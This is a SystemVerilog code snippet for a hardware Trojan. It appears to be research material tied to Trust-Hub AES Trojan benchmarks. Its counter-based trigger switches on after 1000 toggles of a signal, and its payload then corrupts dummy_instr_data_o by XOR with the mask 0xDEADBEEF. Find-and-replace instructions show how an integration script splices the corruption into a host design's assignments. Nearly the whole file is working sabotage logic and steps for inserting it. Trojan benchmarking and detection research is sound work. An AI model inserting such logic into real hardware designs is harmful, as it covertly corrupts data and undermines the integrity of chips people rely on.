/**
 * Sequential Integrity Trojan - Code Snippet
 * 
 * Trust-Hub Category: Change Functionality ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
 * 
 * Description:
 *   Corrupts data through XOR bit flips
 *   
 * Trigger: Counter on dummy_instr_data_o
 * Payload: Corrupt dummy_instr_data_o with XOR mask
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Counter-based)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [31:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        if (dummy_instr_data_o) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Data Corruption
// ============================================================

// Corruption mask for XOR operation
localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Integrity Violation: Corrupt dummy_instr_data_o with XOR
//
// Integration Script Must Modify:
//
// IF dummy_instr_data_o is assigned:
//   Find: assign dummy_instr_data_o = data_value;
//   Replace: assign dummy_instr_data_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF dummy_instr_data_o is in always_ff:
//   Find: dummy_instr_data_o <= data_value;
//   Replace: dummy_instr_data_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// Note: Adjust CORRUPTION_MASK width to match signal width if needed